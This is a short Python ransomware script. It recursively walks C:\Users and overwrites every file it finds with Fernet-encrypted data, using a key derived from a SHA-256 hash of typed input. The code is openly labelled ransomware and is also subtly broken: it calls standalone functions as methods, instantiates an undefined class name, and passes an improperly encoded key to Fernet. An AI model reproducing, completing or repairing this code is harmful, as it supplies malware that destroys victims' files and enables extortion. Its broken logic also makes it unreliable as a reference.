import os
from typing import Text
import hashlib

from cryptography.fernet import Fernet


# Creates the key to encrypt the files using the Fernet module
def create_key(key: Text):
    cipher_suite = Fernet(key)
    return cipher_suite


# Encrypts and overwrites the contents of the current file
def encrypt_file(input_filename: Text, key: Text):
    with open(input_filename, "rb") as f:
        plaintext = f.read()

    encrypted_text = key.encrypt(plaintext)

    with open(input_filename, "wb") as f:
        f.write(encrypted_text)


class Sherlocked:
    def __init__(self, string: Text):
        self.string_to_key = string

    # Create a hashed value of the string that has been inputted on class initialization
    def sha256_hash_string(self):
        sha256 = hashlib.sha256()
        sha256.update(self.string_to_key.encode('utf-8'))
        return sha256.digest()

    # Starts the program - iterates over the User's data
    def start(self):
        for root, dirs, files in os.walk("C:\\Users"):
            print(f"Found {len(files)} files, initiating encryption.")
            key = self.create_key(self.sha256_hash_string())
            for file in files:
                file_path = os.path.join(root, file)
                print(f"Initiating encryption for: {file}")
                self.encrypt_file(file_path, key)
                print(f"Encryption success!")


if __name__ == "__main__":
    string_to_key = input("Insert key here: ")

    ransomware = ransom_where_key(string_to_key)
    ransomware.start()
